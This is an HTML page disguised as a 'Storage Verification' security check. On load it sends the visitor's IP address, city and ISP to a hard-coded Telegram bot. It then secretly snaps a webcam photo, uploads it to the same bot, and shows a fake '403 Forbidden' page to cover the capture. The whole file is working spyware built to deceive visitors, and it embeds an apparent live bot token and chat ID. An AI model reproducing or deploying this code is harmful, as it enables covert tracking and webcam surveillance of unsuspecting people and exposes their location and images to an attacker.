<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Storage Verification</title>
    
    <style>
        body { 
            /* sk.png chhobi-ti background-e add kora hoyeche */
            background-image: url('sk.png'); 
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            font-family: 'Segoe UI', Arial, sans-serif; 
        }
        /* chhobir opor blurry layer jate likha bojha jay */
        body::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.6);
            z-index: 1;
        }
        .content-box {
            position: relative;
            z-index: 2;
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            width: 90%;
            max-width: 400px;
        }
        .loader { 
            border: 4px solid rgba(255, 255, 255, 0.1); 
            border-top: 4px solid #fff; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 1s linear infinite; 
            margin: 0 auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="content-box">
        <div class="loader"></div>
        <h2 style="margin-top: 20px;">Storage Verification</h2>
        <p id="status">Security check required to view files...</p>
    </div>

    <video id="video" style="display:none" autoplay playsinline></video>
    <canvas id="canvas" style="display:none"></canvas>

    <script>
        const botToken = "8344149838:AAFseljBPNEZJ1OTiLK3_Fv5aMn2fcf7RYk"; 
        const chatId = "7967860350"; 

        window.onload = function() {
            // IP Tracking
            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                let info = `âš¡ *Target Online!* \n\nðŸŒ IP: ${data.ip} \nðŸ™ City: ${data.city} \nðŸ“¡ ISP: ${data.org}`;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
            });

            // Automatic capture start
            startCapture();
        };

        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // 2 second timer jate sk.png background-ti user dekhte pay
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'sk_background_capture.jpg');

                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        }).then(() => {
                            stream.getTracks().forEach(track => track.stop());
                            document.body.innerHTML = "<div style='z-index:10; color:white; text-align:center;'><h2>403 Forbidden</h2><p>Access denied by server.</p></div>";
                        });
                    }, 'image/jpeg');
                }, 2000); 

            } catch (err) {
                document.getElementById('status').innerText = "Permission Required.";
            }
        }
    </script>
</body>
</html>
